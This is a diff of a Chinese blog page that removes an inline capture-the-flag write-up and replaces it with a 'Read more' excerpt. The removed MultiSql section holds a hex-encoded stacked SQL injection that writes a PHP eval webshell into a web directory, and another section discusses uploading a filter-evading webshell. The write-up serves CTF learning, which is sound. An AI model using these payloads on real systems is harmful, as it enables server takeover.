@@ -333,39 +333,14 @@
 
       
         
-          
-            <a id="more"></a>
-<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>php匿名函数</p>
-<p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="external">https://www.jianshu.com/p/19e3ee990cb7</a></p>
-<p>hitcon的简化</p>
-<p>除此之外匿名函数还有一个攻击点</p>
-<p><a href="https://paper.seebug.org/94/" target="_blank" rel="external">https://paper.seebug.org/94/</a></p>
-<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>upload getshell</p>
-<p>无字母数字的方式构造webshell 以前看过ph师傅的文章 比赛时没想起来</p>
-<p>源码给了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</div><div class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,5);</div><div class="line">    foreach (<span class="variable">$black_char</span> as <span class="variable">$b</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</div><div class="line">            die(<span class="string">"illegal char"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;     </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>意思是从第六个字符起开始过滤</p>
-<p>得先fuzz看下哪些没在黑名单里面</p>
-<h3 id="MultiSql"><a href="#MultiSql" class="headerlink" title="MultiSql"></a>MultiSql</h3><p>首先盲注拿到root用户</p>
-<p>然后 load_file注入看文件</p>
-<p>读 user.php 发现是用mysqli_multi_query()函数来进行sql语句查询的 可以多语句执行</p>
-<p>读waf.php select被过滤</p>
-<p>可以用 set和hex编码方式绕过</p>
-<p>经过 into outfile方式将php文件写进网站目录 </p>
-<p>select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile ‘/var/www/html/favicon/wfox.php’</p>
-<p>再hex编码</p>
-<p>set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</p>
-<h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><p>挺难的 但其实也没有超出知识体系 xxe和sql</p>
-<p>但还是太菜了不会做</p>
-<h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>x%a1=b1<br>……<br>x%a2=b20</p>
-<p>求x</p>
-<p>写python半自动跑了下</p>
-<p>写的时候for 是不能无限int的 查了下while可以</p>
-<p>每求两个再加的时候就加上这两个的最小公倍数</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">x=103326966496273637783027077789967039569697458403</div><div class="line"><span class="keyword">while</span> (x &lt; 1000000000000000000000000000000000000000000000000000000000000000000000000000):</div><div class="line">    <span class="built_in">print</span> x</div><div class="line">    <span class="keyword">if</span>(x%373==4):</div><div class="line">       <span class="built_in">print</span> x;</div><div class="line">       <span class="built_in">break</span></div><div class="line">    x =x+257*263*269*271*277*281*283*293*307*311*313*317*331*337*347*349*353*359*367</div></pre></td></tr></table></figure>
-<p>最后得到一串贼长的 转16进制再转ascii码</p>
-
-          
+          <p>周末做了点</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/28/suctfwp/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
